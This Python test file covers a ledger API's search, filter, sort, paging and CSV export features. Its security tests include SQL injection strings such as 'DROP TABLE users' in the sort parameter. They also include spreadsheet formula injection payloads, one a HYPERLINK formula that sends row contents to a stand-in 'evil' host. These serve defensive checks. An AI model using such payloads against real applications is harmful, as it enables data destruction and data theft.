"""Searching, filtering, sorting, paging and exporting the ledger.

search_transactions is the first query in this codebase whose WHERE clause
and ORDER BY are assembled at runtime, so the tests that matter most are
not the ones proving a filter narrows a list. They are the ones proving
that nothing a caller submits can reach SQL as anything but a value, and
that paging cannot lose a row.
"""

from decimal import Decimal

from server import operations


def a_category(client, kind="Expense"):
    return next(one["id"] for one in client.get("/api/v1/categories").get_json()["items"]
                if one["type"] == kind)


def add(client, **overrides):
    body = {"date": "2026-08-01", "category_id": a_category(client),
            "amount": "100.00", "type": "Expense", "description": "row"}
    body.update(overrides)
    return client.post("/api/v1/transactions", headers=client.headers, json=body)


def search(client, query=""):
    return client.get("/api/v1/transactions" + query).get_json()


def stock(client):
    """A small ledger to search: a registered account starts empty.

    Deliberately includes two rows sharing a date, which is what makes the
    paging tiebreak matter, and a spread of amounts and months.
    """
    rows = [
        ("2026-06-15", "300.00", "Expense", "june coffee"),
        ("2026-07-11", "1500.00", "Expense", "metro pass"),
        ("2026-08-01", "56000.00", "Income", "august salary"),
        ("2026-08-01", "15000.00", "Expense", "august rent"),
        ("2026-08-05", "3400.00", "Expense", "weekly groceries"),
        ("2026-08-19", "1400.00", "Expense", "weekend brunch"),
    ]
    for date, amount, kind, description in rows:
        add(client, date=date, amount=amount, type=kind,
            category_id=a_category(client, kind), description=description)
    return len(rows)


# --- the shape of the answer ------------------------------------------------

def test_the_list_carries_its_paging(make_api_account):
    """Never a bare array: an array has nowhere to put the total, and adding
    one later breaks every client that was indexing into it."""
    body = search(make_api_account())
    assert set(body) == {"items", "page"}
    assert set(body["page"]) == {"number", "per_page", "total", "pages"}


def test_the_page_count_rounds_up(make_api_account):
    """Six rows at four a page is two pages, not one."""
    client = make_api_account()
    stock(client)
    page = search(client, "?per_page=4")["page"]
    assert page["total"] == 6
    assert page["pages"] == 2


def test_an_empty_result_is_still_one_page(make_api_account):
    """Zero pages would make a pager render nothing at all."""
    body = search(make_api_account(), "?q=nothingmatchesthis")
    assert body["items"] == []
    assert body["page"]["total"] == 0
    assert body["page"]["pages"] == 1


# --- filters ----------------------------------------------------------------

def test_searching_matches_description_and_category(make_api_account):
    """"groceries" is as likely to be a category as a note."""
    client = make_api_account()
    stock(client)
    add(client, description="bought milk")
    by_description = search(client, "?q=milk")
    assert by_description["page"]["total"] == 1

    named = client.get("/api/v1/categories").get_json()["items"][0]["name"]
    by_category = search(client, f"?q={named}")
    assert by_category["page"]["total"] >= 1
    assert all(row["category"] == named or named.lower() in (row["description"] or "").lower()
               for row in by_category["items"])


def test_searching_ignores_case(make_api_account):
    client = make_api_account()
    add(client, description="Weekend Brunch")
    assert search(client, "?q=weekend brunch")["page"]["total"] == 1


def test_a_percent_sign_is_a_literal_not_a_wildcard_for_the_caller(make_api_account):
    """The pattern is built here; a submitted % must not widen the search
    to everything, and must not break the query either."""
    client = make_api_account()
    add(client, description="100% cotton")
    assert search(client, "?q=100%25 cotton")["page"]["total"] == 1


def test_filtering_by_date_range(make_api_account):
    client = make_api_account()
    add(client, date="2026-06-15", description="june")
    add(client, date="2026-08-15", description="august")

    assert search(client, "?from=2026-08-01")["page"]["total"] >= 1
    both = search(client, "?from=2026-06-01&to=2026-06-30")
    assert all(row["date"].startswith("2026-06") for row in both["items"])


def test_filtering_by_type(make_api_account):
    client = make_api_account()
    stock(client)
    body = search(client, "?type=Income")
    assert body["items"]
    assert {row["type"] for row in body["items"]} == {"Income"}


def test_filtering_by_amount_range(make_api_account):
    client = make_api_account()
    stock(client)
    body = search(client, "?min=1000&max=5000")
    assert body["items"]
    for row in body["items"]:
        assert Decimal("1000") <= Decimal(row["amount"]) <= Decimal("5000")


def test_filtering_by_category(make_api_account):
    client = make_api_account()
    stock(client)
    category_id = a_category(client)
    name = next(one["name"] for one in client.get("/api/v1/categories").get_json()["items"]
                if one["id"] == category_id)
    body = search(client, f"?category_id={category_id}")
    assert body["items"]
    assert {row["category"] for row in body["items"]} == {name}


def test_filters_combine(make_api_account):
    client = make_api_account()
    stock(client)
    body = search(client, "?type=Expense&min=1000&from=2026-07-01")
    assert body["items"]
    for row in body["items"]:
        assert row["type"] == "Expense"
        assert Decimal(row["amount"]) >= 1000
        assert row["date"] >= "2026-07-01"


def test_an_unreadable_filter_is_ignored_rather_than_refused(make_api_account):
    """A filter arrives from a URL somebody may have edited or shared.
    Answering a typo'd date with a 422 instead of a list is worse than
    ignoring it -- these narrow a result set, they do not write anything."""
    client = make_api_account()
    stock(client)
    everything = search(client)["page"]["total"]
    for bad in ("?from=not-a-date", "?min=abc", "?category_id=xyz", "?type=Sideways"):
        body = search(client, bad)
        assert body["page"]["total"] == everything, bad


# --- sorting ----------------------------------------------------------------

def test_sorting_by_amount(make_api_account):
    client = make_api_account()
    stock(client)
    amounts = [Decimal(row["amount"])
               for row in search(client, "?sort=amount&direction=asc")["items"]]
    assert amounts == sorted(amounts)

    amounts = [Decimal(row["amount"])
               for row in search(client, "?sort=amount&direction=desc")["items"]]
    assert amounts == sorted(amounts, reverse=True)


def test_an_unknown_sort_falls_back_instead_of_reaching_sql(make_api_account):
    """ORDER BY cannot take a parameter, so the column name is looked up in
    a whitelist. Anything not in it must become the default, silently."""
    client = make_api_account()
    stock(client)
    default = search(client)["items"]
    for attack in ("?sort=t.amount", "?sort=1", "?sort=amount;DROP TABLE users",
                   "?direction=asc--", "?direction=; DELETE FROM transactions"):
        body = search(client, attack)
        assert body["items"] == default, attack

    # And the table is still there.
    assert search(client)["page"]["total"] == len(default)


def test_the_sort_whitelist_is_the_only_way_in():
    """A unit check on the dictionary itself, so adding a column later is a
    deliberate act rather than something a caller can do."""
    assert set(operations.SORT_COLUMNS) == {"date", "amount", "category", "type",
                                           "account"}
    assert set(operations.SORT_DIRECTIONS) == {"asc", "desc"}
    assert all(value in ("ASC", "DESC") for value in operations.SORT_DIRECTIONS.values())


# --- paging -----------------------------------------------------------------

def test_paging_never_repeats_or_loses_a_row(make_api_account):
    """Without a tiebreak, two rows on the same date can swap places between
    one page and the next, so one of them is never seen at all. The demo
    seeds several rows sharing a date, which is what makes this bite."""
    client = make_api_account()
    stock(client)
    everything = search(client, "?per_page=200")
    total = everything["page"]["total"]

    seen = []
    for number in range(1, everything["page"]["pages"] + 3):
        page = search(client, f"?per_page=3&page={number}")
        seen.extend(row["id"] for row in page["items"])
        if not page["items"]:
            break

    assert len(seen) == total
    assert len(set(seen)) == total
    assert seen == [row["id"] for row in everything["items"]]


def test_per_page_is_capped(make_api_account):
    """Otherwise one request can ask for every row an account has."""
    body = search(make_api_account(), "?per_page=100000")
    assert body["page"]["per_page"] == operations.MAX_PER_PAGE


def test_a_page_past_the_end_is_empty_not_an_error(make_api_account):
    body = search(make_api_account(), "?page=9999")
    assert body["items"] == []
    assert body["page"]["number"] == 9999


def test_search_needs_a_session(client):
    assert client.get("/api/v1/transactions?q=anything").status_code == 401


def test_search_cannot_reach_another_account(make_api_account):
    mine, theirs = make_api_account(), make_api_account()
    add(theirs, description="their private note")
    assert search(mine, "?q=their private note")["page"]["total"] == 0


# --- export -----------------------------------------------------------------

def csv_of(client, query=""):
    response = client.get("/api/v1/transactions/export.csv" + query)
    assert response.status_code == 200
    return response


def test_the_export_is_a_csv_file_excel_will_open(make_api_account):
    response = csv_of(make_api_account())
    assert response.headers["Content-Type"] == "text/csv; charset=utf-8"
    assert "attachment;" in response.headers["Content-Disposition"]
    body = response.get_data(as_text=True)
    # The byte order mark, without which Excel reads it in the local
    # codepage and a rupee sign arrives as mojibake.
    assert body.startswith("﻿")
    assert body.splitlines()[0].endswith(
        '"Date","Account","Category","Type","Amount","Currency","Description",'
        '"Transfer"')


def test_the_export_obeys_the_same_filters_as_the_list(make_api_account):
    """Downloading a different set from the one on screen is a good way to
    hand somebody the wrong figures."""
    client = make_api_account()
    stock(client)
    listed = search(client, "?type=Income")["page"]["total"]
    exported = len(csv_of(client, "?type=Income").get_data(as_text=True).splitlines()) - 1
    assert exported == listed


def test_the_export_is_every_matching_row_not_one_page(make_api_account):
    client = make_api_account()
    stock(client)
    total = search(client, "?per_page=200")["page"]["total"]
    exported = len(csv_of(client, "?per_page=2").get_data(as_text=True).splitlines()) - 1
    assert exported == total


def test_a_description_cannot_become_a_formula(make_api_account):
    """A cell beginning = + - or @ executes when the file is opened.
    '=HYPERLINK("http://x/"&A1,"click")' sends the row it sits in to
    whoever wrote it."""
    client = make_api_account()
    for hostile in ('=1+1', '+1', '-1', '@SUM(A1)',
                    '=HYPERLINK("http://evil/"&A1,"click")'):
        add(client, description=hostile)

    body = csv_of(client).get_data(as_text=True)
    for line in body.splitlines()[1:]:
        for cell in line.split('","'):
            assert not cell.strip('"').startswith(("=", "+", "-", "@")), line


def test_the_export_amount_is_a_number_a_spreadsheet_can_add(make_api_account):
    """"₹1,400.00" is a string to a spreadsheet, not a figure."""
    client = make_api_account()
    stock(client)
    lines = csv_of(client).get_data(as_text=True).splitlines()
    # Found by name rather than counted to, so adding a column to the export
    # does not quietly point this at something else.
    header = [cell.strip('"﻿') for cell in lines[0].split('","')]
    amount = header.index("Amount")
    Decimal(lines[1].split('","')[amount].strip('"'))


def test_the_export_needs_a_session(client):
    assert client.get("/api/v1/transactions/export.csv").status_code == 401
